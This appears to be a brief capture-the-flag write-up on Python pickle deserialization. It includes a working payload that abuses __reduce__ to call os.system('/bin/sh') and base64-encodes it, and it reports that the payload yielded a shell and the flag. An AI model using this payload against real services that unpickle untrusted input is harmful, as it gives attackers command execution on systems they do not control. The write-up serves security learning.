This post introduced a way of pickle exploiting. It uses __reduce__ callback of particular object, while pickle/unpickle, the callback is called. So created a class with __reduce__ callback to launch /bin/sh, pickled the class and encoded with base64, when import it should spawn a shell.

class run(object):
  def __reduce__(self):
    import os
    return (os.system, ('/bin/sh',))

print(base64.b64encode(pickle.dumps(run())))

Imported the payload, it gave shell, the flag was in flag.txt.
